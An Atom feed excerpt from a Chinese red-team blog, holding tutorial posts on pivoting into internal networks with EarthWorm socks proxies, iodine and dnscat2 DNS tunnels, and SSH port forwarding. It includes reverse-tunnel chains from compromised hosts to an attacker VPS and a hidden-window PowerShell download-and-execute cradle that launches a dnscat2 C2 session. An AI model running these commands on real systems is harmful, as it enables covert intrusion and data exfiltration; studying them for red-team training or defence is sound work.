    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;相较于前一篇文章介绍的 ew 的年代久远，frp 就好的多了，基本上隔几天就会发布新的版本，最新的一版更新还就在几天前。&lt;/</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】10、ew 的使用</title>
    <link href="https://www.teamssix.com/year/210610-164507.html"/>
    <id>https://www.teamssix.com/year/210610-164507.html</id>
    <published>2021-06-10T08:45:07.000Z</published>
    <updated>2021-06-10T11:51:35.914Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、Socks-代理工具介绍"><a href="#1、Socks-代理工具介绍" class="headerlink" title="1、Socks 代理工具介绍"></a>1、Socks 代理工具介绍</h2><p>Socks 代理可以理解成升级版的 lcx，关于 lcx 的用法可以看我之前的文章：</p><p><a href="https://teamssix.com/year/210528-130449.html">https://teamssix.com/year/210528-130449.html</a></p><p>但是 lcx 毕竟年代久远，现在的杀软基本也都能识别到了，因此在实战中不太推荐使用 lcx ，更推荐使用这些 socks 代理工具。</p><p>常见的 socks 代理工具有 ew、termite、frp、nps、sSocks、reGeorg、Neo-reGeorg、SocksCap、Proxifier、ProxyChains 等等，不同的工具适合使用的场景和方法都有所不同。</p><p>因为在这其中有些工具笔者较经常使用，所以这里主要记录下 ew、frp、nps 的使用方法，本篇文章主要记录 ew 的使用，后续文章将更新 frp、nps 的使用。</p><p>开始之前，先理解下正向代理和反向代理的区别。</p><blockquote><p>正向代理：主动通过代理访问目标主机，即攻击主机 –》目标主机</p><p>反向代理：目标机器通过代理进行主动连接，即目标主机 –》攻击主机</p></blockquote><h2 id="2、ew-的使用"><a href="#2、ew-的使用" class="headerlink" title="2、ew 的使用"></a>2、ew 的使用</h2><p>ew 的项目主页：<a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><p>ew 全称 <code>EarthWorm</code>，直译过来就是<code>蚯蚓</code>，引用作者的原话是：</p><blockquote><p>该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。</p></blockquote><p>这个描述也是很形象了。</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>作者已经不提供 ew 的下载了，但是搜了一下 github 还是有其他人上传的，不过病毒需自查。</p><p>下载地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p>从这工具上传的时间是 5 年前就可以看出这个工具很有年代感了。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>该工具共有 6 种命令格式 ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran，正向连接的命令是 ssocked，反向连接的命令是 rcsocks 和 rssocks，其他命令用于一些比较复杂的网络环境中。</p><h4 id="a、正向连接"><a href="#a、正向连接" class="headerlink" title="a、正向连接"></a>a、正向连接</h4><p>正向连接需要目标主机有一个公网 IP，或者说攻击主机能够直接访问到目标主机。</p><p>命令也很简单</p><pre><code>ew -s ssocksd -l 1080</code></pre><pre><code> -s 设置状态模式 -l 设置监听端口</code></pre><pre><code>&gt; .\ew_for_Win.exe -s ssocksd -l 1080ssocksd 0.0.0.0:1080 &lt;--[10000 usec]--&gt; socks server</code></pre><p>然后使用 SocksCap、Proxifier、ProxyChains 等工具配置上目标主机的 IP 和监听端口即可，socks 要选择 socks5</p><h4 id="b、反向连接"><a href="#b、反向连接" class="headerlink" title="b、反向连接"></a>b、反向连接</h4><p>反向连接适合于目标没有公网 IP 的情况，这时就需要一台公网 vps 了，这里就直接以内网地址作为演示了。</p><p>在公网 VPS 上执行以下命令：</p><pre><code>ew -s rcsocks -l 1080 -e 4444</code></pre><pre><code> -e 设置反弹主机端口</code></pre><pre><code>&gt; ./ew_for_linux64 -s rcsocks -l 1080 -e 4444</code></pre><p>这条命令表示将 1080 端口接收到的数据转发到 4444 端口上。</p><p>在目标主机上执行以下命令：</p><pre><code>ew -s rssocks -d vps_ip -e 4444</code></pre><pre><code>-d 设置反弹主机 IP</code></pre><pre><code>&gt; .\ew_for_Win.exe -s rssocks -d 172.16.214.52 -e 4444</code></pre><p>这条命令表示在本地开启 socks 5 服务，并反弹到 vps 的 4444 端口，如果代理建立成功，在 VPS 端就会看到 <code>rssocks cmd_socket OK!</code> 的提示。</p><p>最后，代理 vps 的 1080 端口就可以访问到目标主机的内网了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-09_10-24-45.png"></p><h4 id="c、二级网络环境（一）"><a href="#c、二级网络环境（一）" class="headerlink" title="c、二级网络环境（一）"></a>c、二级网络环境（一）</h4><p>有这样的一个网络环境，目标主机A有两个网卡，一个内网地址一个公网地址，但这个主机只能访问内网主机B不能访问其他内网资源，而内网主机B不能访问外网但是能访问内网资源。</p><p>在拿到这两台主机权限后，就可以使用 ew 进行二级跳板访问到内网资源。</p><pre><code>内网主机A（有公网IP） --》内网主机B --》内网资源</code></pre><p>在内网主机B上，开启正向连接代理</p><pre><code>ew -s ssocksd -l 4444</code></pre><pre><code>&gt; .\ew_for_Win.exe -s ssocksd -l 4444</code></pre><p>在内网主机A上</p><pre><code>ew -s lcx_tran -l 1080 -f hostB_ip -g 4444</code></pre><pre><code>&gt; ./ew_for_linux64 -s lcx_tran -l 1080 -f 192.168.7.110 -g 4444</code></pre><p>这条命令表示将 1080 端口收到的代理请求转发到内网主机 B 192.168.7.110 的 4444 端口，此时就可以通过访问内网主机 A 的外网 IP 的 1080 端口访问到内网主机 B 上架设的 socks5 代理了。</p><h4 id="d、二级网络环境（二）"><a href="#d、二级网络环境（二）" class="headerlink" title="d、二级网络环境（二）"></a>d、二级网络环境（二）</h4><p>在上面的环境中，内网主机 A 有公网 IP，如果没有公网 IP 的情况下，又该怎么办呢？这时候就需要结合反向连接了，因此需要一台公网的 VPS 主机。</p><pre><code>VPS --》内网主机A --》内网主机B --》内网资源</code></pre><p>在公网 VPS 上</p><pre><code>ew -s lcx_listen -l 1080 -e 4444</code></pre><pre><code>&gt; ./ew_for_linux64 -s lcx_listen -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here</code></pre><p>表示将 1080 收到的 代理请求转发到 4444 端口上</p><p>在内网主机 B 上</p><pre><code>ew -s ssocksd -l 5555</code></pre><pre><code>&gt; .\ew_for_Win.exe -s ssocksd -l 5555</code></pre><p>表示开启 5555 端口的正向代理</p><p>在内网主机 A 上</p><pre><code>ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555</code></pre><pre><code>&gt; ./ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555</code></pre><p>表示在内网主机 A 上使用 lcx_slave 的方式，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来。</p><p>现在就可以通过 VPS 的 1080 端口访问到内网主机 A 再访问到内网主机 B ，最后访问到内网资源了。</p><h4 id="e、三级网络环境"><a href="#e、三级网络环境" class="headerlink" title="e、三级网络环境"></a>e、三级网络环境</h4><p>目前有这样的一个环境，内网主机 A 没有公网 IP 不能访问内网资源，但是可以访问外网和内网主机 B，内网主机 B 不能访问外网和内网资源，但是可以和 A、C 相互访问，内网主机 C 能访问内网资源，但是只能和内网主机 B 相互访问，因此如果想访问到内网资源就需要做三层跳板。</p><pre><code>VPS --》内网主机 A --》内网主机 B --》内网主机 C</code></pre><p>在公网 VPS 上，将 1080 端口收到的代理请求转发到 4444 端口</p><pre><code>ew -s rcsocks -l 1080 -e 4444</code></pre><pre><code>&gt; ./ew_for_linux64 -s rcsocks -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here</code></pre><p>在内网主机 A 上，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来</p><pre><code>ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555</code></pre><pre><code>&gt; ./ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555</code></pre><p>在内网主机 B 上，将 5555 端口收到的代理请求转发到 6666 端口上</p><pre><code>ew -s lcx_listen -l 5555 -e 6666</code></pre><pre><code>&gt; .\ew_for_Win.exe -s lcx_listen -l 5555 -e 6666rcsocks 0.0.0.0:5555 &lt;--[10000 usec]--&gt; 0.0.0.0:6666init cmd_server_for_rc herestart listen port here</code></pre><p>在内网主机 C 上，启动 socks5 服务，并反弹到 B 主机的 6666 端口上</p><pre><code>ew -s rssocks -d 192.168.7.110 -e 6666</code></pre><pre><code>&gt; .\ew_for_Win.exe -s rssocks -d 192.168.7.110 -e 6666rssocks 192.168.7.110:6666 &lt;--[10000 usec]--&gt; socks server</code></pre><p>至此，socks5 代理 VPS 的 1080 端口就会访问到内网资源了。</p><p>另外还有个 ew 的升级版工具叫 termite，不过比较遗憾的是 termite 在两年前也已经暂停更新了，这里也就不再大费周章的记录它了。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、Socks-代理工具介绍&quot;&gt;&lt;a href=&quot;#1、Socks-代理工具介绍&quot; class=&quot;headerlink&quot; title=&quot;1、Socks 代理工具介绍&quot;&gt;&lt;/a&gt;1、Socks 代理工具介绍&lt;/h2&gt;&lt;p&gt;Socks 代理可以理解成升级版的 lcx，</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】9、iodine 使用</title>
    <link href="https://www.teamssix.com/year/210608-213403.html"/>
    <id>https://www.teamssix.com/year/210608-213403.html</id>
    <published>2021-06-08T13:34:03.000Z</published>
    <updated>2021-06-08T13:51:21.517Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>iodine 这个名字起的很有意思，iodine 翻译过来就是碘，碘的原子序数为 53，53 也就是 DNS 服务对应的端口号。 </p><p>iodine 和 dnscat2 一样，适合于其他请求方式被限制以至于只能发送 DNS 请求的环境中，iodine 同样也是分成了直接转发和中继两种模式。</p><p>iodine 与 dnscat2 不同的在于 Iodine 服务端和客户端都是用 C 语言开发，同时 iodine 的原理也有些不同，iodine 通过 TAP 在服务端和客户端分别建立一个局域网和虚拟网卡，再通过 DNS 隧道进行连接，然后使其处在同一个局域网中。</p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>首先需要有一个域名，并设置 NS 和 A 记录，A 记录指向自己的公网 VPS 地址，NS 记录指向 A 记录的子域名。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-20-20.png"></p><p>Kali 下自带 iodine ，Debian Linux 可以使用 apt 进行安装</p><pre><code>sudo apt-get install iodine</code></pre><p>Windows 可以直接到官网下载，下载地址：<a href="https://code.kryo.se/iodine/">https://code.kryo.se/iodine/</a>，服务端名称是 iodined.exe，客户端是 iodine.exe</p><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>这里服务端使用的是 Linux，服务端命令如下：</p><pre><code>sudo iodined -f -c -P teamssix 192.168.77.1 dc.teamssix.com -DD</code></pre><pre><code> -f        在前台运行 -c        不检查传入请求的客户端 IP 地址 -P        客户端与服务端之间的连接密码 -D        调试级别，-D 表示第一级，-DD 表示第二级，依此类推 192.168.77.1 是自己自定义的局域网虚拟 IP 地址。</code></pre><p>这里客户端使用的是 Windows，Windows 客户端上除了要有 iodine 相关文件外，还需要安装 tap 网卡驱动程序，这里我百度找了一个下载地址 <a href="http://www.qudong51.net/qudong/981.html">http://www.qudong51.net/qudong/981.html</a></p><p>打开下载好的 tap 网卡驱动程序，一直下一步下一步安装就行。</p><p>然后就可以启动客户端程序了，注意下载下来的 dll 文件要和 exe 在一个目录下，不能只复制一个 exe 到目标主机上，而且要以管理员权限运行下面的命令。</p><pre><code>.\iodine.exe -f -r -P teamssix dc.teamssix.com</code></pre><pre><code>-r        iodine 有时会自动将 DNS 隧道切换成 UDP 通道，使用 -r 命令可以强制让 iodine 在任何情况下都使用 DNS 隧道</code></pre><p>如果出现 <code>Connection setup complete, transmitting data.</code> 就表示 DNS 隧道就已经建立了。</p><p>这时如果去 ping 服务端自定义的虚拟 IP 也是可以 ping 通的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_21-12-06.png"></p><p>假如这里内网机器分配到了 192.168.77.2 这个 IP ，因为处在一个局域网中，所以 VPS 直接访问 192.168.77.2 的 3389、80 等端口就可以直接访问到内网机器的相关端口了，同样的内网主机也可以访问 VPS 的 22 端口等等，至此便绕过了策略限制。</p><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/micr067/p/12263337.html">https://www.cnblogs.com/micr067/p/12263337.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;iodine 这个名字起的很有意思，iodine 翻译过来就是碘，碘的原子序数为 53，53 也就是 DNS 服务对应的端口</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】dnscat2 使用</title>
    <link href="https://www.teamssix.com/year/210608-150224.html"/>
    <id>https://www.teamssix.com/year/210608-150224.html</id>
    <published>2021-06-08T07:02:24.000Z</published>
    <updated>2021-06-08T07:09:37.307Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>dnscat2 是一款 C2 工具，与常规 C2 工具不同的是它利用了 DNS 协议来创建加密的 C2 通道。</p><p>dnacat2 的客户端由 C 语言编写，服务端由 Ruby 语言编写，在攻击主机上开启服务端后，客户端放到目标主机上执行相关命令，攻击主机就能够收到来自客户端的会话了。</p><p>dnscat2 有两种使用模式，一是直连模式，二是中继模式，区别如下：</p><p>直连模式：客户端直接向指定 IP 地址的 DNS 服务器发起 DNS 解析请求</p><p>中继模式：像平时上网一样，DNS 先经过互联网的解析，最终指向我们的恶意 DNS 服务器，与直连模式相比速度较慢但是更安全。</p><p>在安全策略做的比较严格的内网中，如果发现只允许白名单流量出站，而且内网中还有诸多安全设备，同时在传统的 C2 通信无法建立的情况下，RT 就可以尝试使用 DNS 协议建立 C2 通信。</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><h2 id="1、服务端"><a href="#1、服务端" class="headerlink" title="1、服务端"></a>1、服务端</h2><p>这里以 Ubuntu 为例</p><pre><code>git clone https://github.com/iagox86/dnscat2.gitcd dnscat2/server/sudo gem install bundlerbundle install</code></pre><p>如果运行 <code>sudo gem install bundler</code> 提示 <code>Command &#39;gem&#39; not found</code>，则需要先安装 ruby </p><pre><code>sudo apt-get install ruby</code></pre><p>如果运行 <code>bundle install</code> 提示 <code>Gem::Ext::BuildError: ERROR: Failed to build gem native extension.</code>，则需要先安装 ruby-dev</p><pre><code>sudo apt-get install ruby-dev</code></pre><h2 id="2、客户端"><a href="#2、客户端" class="headerlink" title="2、客户端"></a>2、客户端</h2><p>dnscat2 客户端在使用前需要进行编译才能使用，在 Windows 中可以使用 VS 进行编译或者直接使用 PowerShell 的版本，Linux 中可以使用 <code>make install</code> 进行编译。</p><p>Linux 下可以通过以下方法进行编译</p><pre><code>git clone https://github.com/iagox86/dnscat2.gitcd dnscat2/client/make</code></pre><p>Windows 可以直接下载已经编译好的版本</p><p>exe 版（解压密码：password）：<a href="https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip">https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip</a></p><p>PowerShell 版：<a href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p><p>如果使用 PowerShell 版，可以直接使用下面的命令导入，在实际情况中，也更推荐使用 PowerShell 版的，毕竟隐蔽性要更好些。</p><pre><code>IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;)</code></pre><p>或者下载 ps1 文件后，使用以下命令导入</p><pre><code>Import-Module .\dnscat2.ps1</code></pre><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><h2 id="1、直连模式"><a href="#1、直连模式" class="headerlink" title="1、直连模式"></a>1、直连模式</h2><p><strong>启动服务端</strong>，这里服务端 IP 为 172.16.214.50</p><pre><code>cd /dnscat2/serversudo ruby ./dnscat2.rb -s 553 -c teamssix --no-cache</code></pre><pre><code>-s 指定 dns 服务端口-c 指定连接密码--no-cache 禁止缓存，添加该项为了使和 PowerShell 版本的 dnscat2 兼容</code></pre><p><strong>启动客户端</strong>，这里以 Windows 下的 exe 版为例</p><pre><code>dnscat --dns server=172.16.214.50,port=553 --secret=teamssix</code></pre><p>连接成功后，会提示 <code>Session established!</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_16-44-12.png"></p><p>dnscat2 的一些命令</p><pre><code>sessions 或 windows                         查看当前会话session -i 1 或 window -i 1         进入 ID 为 1 的会话shell                     建立交互式会话exec                        远程打开程序download              下载文件help                        查看支持的命令</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/WX20210607-165615@2x.png"></p><p>抓下包，看看流量是什么样子的</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-01-52.png"></p><p>不难看出，流量中有很多 dnscat 的字样，这样一来，虽然使用了 dns 协议，但是隐蔽性还是差了不少，接下来看看中继模式。</p><h2 id="2、中继模式"><a href="#2、中继模式" class="headerlink" title="2、中继模式"></a>2、中继模式</h2><p>在中继模式下，需要自己有一个域名，并添加两条域名解析记录。</p><p>首先创建一条 A 记录指向自己的公网 VPS 地址，之后创建一条 ns 记录指向 A 记录的子域名，示例如下：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-20-20.png"></p><p>如果想要判断自己的解析记录是否设置成功，可以通过以下方法进行判断。</p><p>A 记录：直接通过 nslookup 进行判断，如果解析出了 IP 说明该项配置正确。</p><pre><code>nslookup ns1.teamssix.com</code></pre><p>ns 记录：在公网 VPS 上开启抓包，再<code>nslookup dc.teamssix.com</code>，如果在 VPS 上看到对应的流量记录，说明该项配置正确。</p><pre><code>sudo tcpdump -n -i eth0 udp dst port 53</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_13-46-54.png"></p><p><strong>开启服务端</strong></p><pre><code>sudo ruby dnscat2.rb dc.teamssix.com -c teamssix --no-cache -e open</code></pre><pre><code>-e 指定安全级别，open 表示服务端允许客户端不进行加密</code></pre><p>如果提示<code>Address already in use - bind(2) for &quot;0.0.0.0&quot; port 53</code>，可以关闭<code>systemd-resolved</code></p><pre><code>sudo systemctl stop systemd-resolved</code></pre><p><strong>开启客户端</strong>，这里以 Windows 下的 PowerShell 版为例</p><pre><code>start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip</code></pre><p>也可以把导入的命令和开启客户端的命令放在一起</p><pre><code>powershell.exe -nop -w hidden -c &#123;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;);start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip&#125;</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_14-35-33.png"></p><p>再来抓下包，看看流量是什么样的</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_14-45-40.png"></p><p>可以看出，流量中已经没有了 dnscat 的字样，这也是为什么在介绍部分说中继模式比直连模式更安全的原因。</p><blockquote><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/2214">https://xz.aliyun.com/t/2214</a></p><p><a href="https://blog.csdn.net/localhost01/article/details/86591685">https://blog.csdn.net/localhost01/article/details/86591685</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/104429983">https://blog.csdn.net/qq_36119192/article/details/104429983</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h1&gt;&lt;p&gt;dnscat2 是一款 C2 工具，与常规 C2 工具不同的是它利用了 DNS 协议来创建加密的 C</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】SSH 隧道使用学习</title>
    <link href="https://www.teamssix.com/year/210604-154036.html"/>
    <id>https://www.teamssix.com/year/210604-154036.html</id>
    <published>2021-06-04T07:40:36.000Z</published>
    <updated>2021-06-08T07:10:44.785Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>SSH 全称 <code>Secure Shell</code>，从它的名字来看这个协议就比较安全。SSH 协议是一种应用层协议，支持几乎所有 UNIX、Linux 平台。</p><p>得益于 SSH 协议在传输过程中都是加密，所以在流量层面也较难区分合法的 SSH 流量和攻击者产生的 SSH 流量。</p><p>因此在内网渗透过程中，使用 SSH 协议进行建立隧道的方法，一方面不用自己再上传同类工具，另一方面降低了因上传使用了同类工具被管理员发现的风险。</p><h1 id="0x01-SSH-常用命令介绍"><a href="#0x01-SSH-常用命令介绍" class="headerlink" title="0x01 SSH 常用命令介绍"></a>0x01 SSH 常用命令介绍</h1><p>相信各位平时最常使用的 SSH 命令就是拿来连接 Linux 系统了，命令一般是这样：</p><pre><code>ssh root@192.168.1.1</code></pre><p>或者 -p 指定自己自定义的 SSH 端口、-i 指定自己的私钥文件等等。</p><p>如果拿 SSH 来创建隧道则需要用到下面的命令：</p><pre><code> -C 压缩传输，提高传输速度。 -f 将 SSH 传输转入后台执行，不占用当前 shell -N 建立静默连接（建立了连接但看不到具体会话） -g 允许远程主机连接本地用于转发的端口。 -L 本地端口转发 -R 远程端口转发 -D 动态转发（ SOCKS 代理） -p 指定 SSH 端口</code></pre><h1 id="0x02-本地转发"><a href="#0x02-本地转发" class="headerlink" title="0x02 本地转发"></a>0x02 本地转发</h1><p>目前有这样的一个环境，外网有一台攻击主机 ，可访问处于内网环境的 Web 服务器（双网卡），但无法访问 Web 服务器所在内网的办公主机，接下来就用 SSH 进行流量转发，使外网的攻击主机通过 Web 服务器访问到位于内网的办公主机。</p><p>环境拓扑如下：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh1.jpg"></p><p>在攻击主机上执行以下命令，将内网办公主机的 3389 端口映射到自己的 3388 端口上</p><pre><code>ssh -CfNg -L 攻击主机端口:内网办公主机IP:内网办公主机端口 Web服务器ssh用户名@Web服务器IP</code></pre><pre><code class="#">&gt; ssh -CfNg -L 3388:192.168.7.110:3389 root@172.16.214.5root@172.16.214.5&#39;s password:</code></pre><p>这条命令的意思就是将 Web 服务器 172.16.214.5 作为跳板，将内网办公主机的 3389 端口转发到攻击主机的 3388 端口，这样只要访问攻击主机的 3388 端口就会访问到内网办公主机的 3389 端口了。</p><p>为了判断代理转发是否建立成功，可以通过 <code>netstat</code> 进行判断</p><pre><code>netstat -pantu | grep &quot;3388&quot;</code></pre><pre><code class="netstat">&gt; netstat -pantu | grep &quot;3388&quot;tcp        0      0 0.0.0.0:3388            0.0.0.0:*               LISTEN      14086/sshtcp6       0      0 :::3388                 :::*                    LISTEN      14086/ssh</code></pre><p>可以看到 ssh 程序已经监听 3388 端口了，接下来连接本地的 3388 端口就可以连接到内网办公主机的 3389 端口了</p><pre><code>rdesktop 127.0.0.1:3388</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh2.png"></p><h1 id="0x03-远程转发"><a href="#0x03-远程转发" class="headerlink" title="0x03 远程转发"></a>0x03 远程转发</h1><p>远程转发在这里其实也可以说是反向代理，目前有这样的一个环境：内网中不存在边界设备，但是内网的 Web 服务器能访问到攻击主机，而内网的办公主机则不行。</p><p>因此可以在拿到 Web 服务器的 Shell 后，采用远程转发的方式，即利用 Web 服务器 SSH 连接到攻击主机上进行代理转发，然后访问攻击主机的端口即可，拓扑图如下：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh3.jpg"></p><p>将 Web 服务器作为跳板，进行远程转发</p><pre><code>ssh -CfNg -R 攻击主机端口:内网办公主机IP:内网办公主机端口 攻击主机ssh用户名@攻击主机IP</code></pre><pre><code>&gt; ssh -CfNg -R 3388:192.168.7.110:3389 root@172.16.214.48root@172.16.214.48&#39;s password:</code></pre><p>同样的，为了判断代理转发是否建立成功，也可以通过 <code>netstat</code> 进行判断，和之前一样都是在攻击主机下执行下面的命令</p><pre><code>netstat -pantu | grep &quot;3388&quot;</code></pre><pre><code>&gt; netstat -pantu | grep &quot;3388&quot;tcp        0      0 127.0.0.1:3388          0.0.0.0:*               LISTEN      24728/sshd: roottcp6       0      0 ::1:3388                :::*                    LISTEN      24728/sshd: root</code></pre><p>可以看到，同样的，在攻击主机上 3388 端口的监听已经被开启了，此时直接在攻击主机上访问 127.0.0.1:3388 就可以连接到 192.168.7.110:3389 了</p><pre><code>rdesktop 127.0.0.1:3388</code></pre><h1 id="0x04-动态转发"><a href="#0x04-动态转发" class="headerlink" title="0x04 动态转发"></a>0x04 动态转发</h1><p>动态转发需要攻击主机能够访问到目标主机，因此这里采用和本地转发一样的拓扑进行演示。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh1.jpg"></p><p>在攻击主机上执行下面的命令</p><pre><code>ssh -CfNg -D 攻击主机端口 Web服务器ssh用户名@Web服务器IP</code></pre><pre><code>&gt; ssh -CfNg -D 4444 root@172.16.214.5root@172.16.214.5&#39;s password:</code></pre><p>使用 <code>netstat</code> 可以看到现在 4444 端口已经被监听了</p><pre><code>netstat -pantu | grep &quot;4444&quot;</code></pre><pre><code>&gt; netstat -pantu | grep &quot;4444&quot;tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      3979/sshtcp6       0      0 :::4444                 :::*                    LISTEN      3979/ssh</code></pre><p>动态转发其实就是建立一个 socks 连接，任何支持 socks 4/5 协议的程序都可以使用这个加密通道进行访问，例如这里以 proxychains 为例，借助 proxychains 从攻击主机访问到内网的办公主机的 3389 端口。</p><p>在 kali 上如果没有自带 